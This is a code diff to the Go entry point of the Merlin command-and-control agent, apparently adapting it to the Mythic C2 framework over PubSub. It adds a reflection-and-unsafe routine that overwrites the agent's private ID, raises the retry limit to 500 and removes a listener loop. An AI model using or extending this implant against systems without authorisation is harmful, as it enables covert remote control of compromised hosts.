@@ -25,12 +25,14 @@ import (
 	"encoding/json" // Added for parsing transport_config.json in pubsub case
 	"fmt"
 	"os"
+	"reflect"
 	"strconv"
 	"strings"
-	"time"
+	"unsafe"
 
 	// 3rd Party
 	"github.com/fatih/color"
+	"github.com/google/uuid"
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin-agent/v2/agent"
@@ -66,7 +68,7 @@ var ja3 string
 var killdate = "0"
 
 // maxretry the number of failed connections to the server before the agent will quit running
-var maxretry = "7"
+var maxretry = "500"
 
 // padding the maximum size for random amounts of data appended to all messages to prevent static message sizes
 var padding = "4096"
@@ -116,6 +118,52 @@ var agentToServerTopic = ""
 var serverToAgentSub = ""
 var agentToServerSub = ""
 var credentialsJSON = ""
+
+// setAgentID uses reflection to override the agent's private id field
+// This is necessary because Mythic expects the agent to use the payloadID,
+// but agent.New() generates a random UUID
+func setAgentID(a interface{}, newID uuid.UUID) error {
+	v := reflect.ValueOf(a).Elem()
+	t := v.Type()
+
+	// Find UUID field by type (field names are obfuscated)
+	var idField reflect.Value
+	var fieldIndex int = -1
+
+	for i := 0; i < v.NumField(); i++ {
+		fieldType := t.Field(i).Type.String()
+		// Look for UUID type (will be like "DPzPMG5.UUID" or "uuid.UUID")
+		if strings.Contains(fieldType, "UUID") {
+			idField = v.Field(i)
+			fieldIndex = i
+			if core.Verbose {
+				color.Green(fmt.Sprintf("[+] Found UUID field at index %d: %s (type: %s)", i, t.Field(i).Name, fieldType))
+			}
+			break
+		}
+	}
+
+	if fieldIndex == -1 {
+		// Debug: Print all available field names
+		if core.Verbose {
+			color.Yellow("[DEBUG] UUID field not found. Available fields:")
+			for i := 0; i < v.NumField(); i++ {
+				color.Yellow(fmt.Sprintf("  - %s (type: %s)", t.Field(i).Name, t.Field(i).Type))
+			}
+		}
+		return fmt.Errorf("UUID field not found in agent struct")
+	}
+
+	// Make the private field writable using unsafe
+	idField = reflect.NewAt(idField.Type(), unsafe.Pointer(idField.UnsafeAddr())).Elem()
+	idField.Set(reflect.ValueOf(newID))
+
+	if core.Verbose {
+		color.Cyan(fmt.Sprintf("[*] Agent UUID successfully set to payloadID: %s", newID.String()))
+	}
+
+	return nil
+}
 
 func main() {
 	core.Verbose, _ = strconv.ParseBool(verbose)
@@ -230,8 +278,32 @@ func main() {
 			}
 		}
 
-		// Create pubsub client using the config and agent ID
-		client, err = NewPubSubClient(&pubsubConfig, a.ID().String())
+		// For Mythic integration, override the agent's UUID to use the payloadID
+		// This ensures Mythic recognizes the agent and messages are accepted
+		if payloadID != "" {
+			payloadUUID, err := uuid.Parse(payloadID)
+			if err != nil {
+				if core.Verbose {
+					color.Red(fmt.Sprintf("failed to parse payloadID: %s", err.Error()))
+				}
+				os.Exit(1)
+			}
+
+			err = setAgentID(&a, payloadUUID)
+			if err != nil {
+				if core.Verbose {
+					color.Red(fmt.Sprintf("failed to set agent ID: %s", err.Error()))
+				}
+				os.Exit(1)
+			}
+
+			if core.Verbose {
+				color.Cyan(fmt.Sprintf("[*] Agent UUID set to payloadID: %s", payloadID))
+			}
+		}
+
+		// Create pubsub client using the config and agent ID (use payloadID for Mythic)
+		client, err = NewPubSubClient(&pubsubConfig, payloadID)
 		if err != nil {
 			if core.Verbose {
 				color.Red(fmt.Sprintf("failed to create pubsub client: %s", err.Error()))
@@ -243,23 +315,8 @@ func main() {
 			color.Green("[+] PubSub client initialized successfully")
 		}
 
-		// For PubSub (asynchronous client), manually start the listener
-		// run.Run() only calls Listen() for synchronous clients
-		if client.Synchronous() == false {
-			go func() {
-				if core.Verbose {
-					color.Cyan("[*] Starting async listener loop for PubSub")
-				}
-				for {
-					_, err := client.Listen()
-					if err != nil && core.Verbose {
-						color.Red(fmt.Sprintf("[-] Listen error: %v", err))
-					}
-					// Brief sleep to avoid tight loop
-					time.Sleep(100 * time.Millisecond)
-				}
-			}()
-		}
+		// Note: Removed manual listener loop - not needed for async clients
+		// run.Run() handles message processing through its main loop
 	default:
 		if core.Verbose {
 			color.Red(fmt.Sprintf("unknown C2 profile: %s", profile))
@@ -267,6 +324,6 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Start the agent
+	// Start the agent - run.Run() blocks and handles everything
 	run.Run(a, client)
 }
